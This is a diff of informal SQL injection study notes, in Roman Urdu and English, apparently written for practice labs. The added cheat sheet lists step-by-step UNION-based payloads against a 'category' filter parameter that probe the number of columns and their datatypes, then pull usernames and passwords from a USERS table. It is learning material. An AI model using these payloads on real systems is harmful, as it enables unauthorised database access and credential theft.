@@ -3,9 +3,7 @@ SQLi Bug Hunting Notes:(UNION BUG DAY01)
 
 Hum sb sa pahla dakha ga number of rows and columns kitna han original query k
 Phir hum un ki datatype check karan ga.
-Example :- 2 columns han original query k aik ki datatype number ha 2nd ki string ya text 
-Table |  id |  name|
-|—---------------------|
+Example :- 2 columns han original query k aik ki datatype number ha 2nd ki string ya text .
 Select id, name from  TABLE_NAME;
 
 Ab hum union use kar sakta han with some rules:
@@ -198,13 +196,31 @@ Administrator~s3cure  : )
 —---------------------------------------------------------->>>
 
 
+CHEAT SHEET FOR LABS:
 
 
-
-
-
-
-
+GET /filter?category=Gifts 
+Step 1 : 
+FInd the number of columns 🙂
+GET /filter?category=Gifts ‘ UNION SELECT NULL –
+GET /filter?category=Gifts ‘ UNION SELECT NULL , NULL –
+GET /filter?category=Gifts ‘ UNION SELECT NULL, NULL, NULL –
+TRY UNTIL YOU GOT 200 OK RESPONSE : )
+STEP 2 : 
+CHECK THE DATATYPE OF THE COLUMN,
+GET /filter?category=Gifts ‘ UNION SELECT ‘A’, NULL, NULL –
+GET /filter?category=Gifts ‘ UNION SELECT NULL, ‘A’, NULL –
+GET /filter?category=Gifts ‘ UNION SELECT NULL, NULL, ‘A’ –
+YOU WILL GET THE IDEA OF THE DATATYPES AFTER THIS : )
+STEP 3 : 
+GET REAL DATA BY FINDING THE NUMBER OF COLUMNS AND DATATYPES.
+GET /filter?category=Gifts ‘ UNION SELECT USERNAME, PASSWORD FROM USERS –
+STEP 4 : 
+GET USERNAME AND PASSWORD IN A SINGLE COLUMN 😣
+WE CAN GET IN ONE COLUMN IF THE OUTPUT COMES WITH ONE COLUMN
+SOL:
+GET /filter?category=Gifts ‘ UNION SELECT USERNAME || ‘~’ || PASSWORD FROM USERS–
+YOU WILL GET THE USERNAME AND PASSWORD IN SINGLE COLUMN AND BOOM 😀.
 
 
 
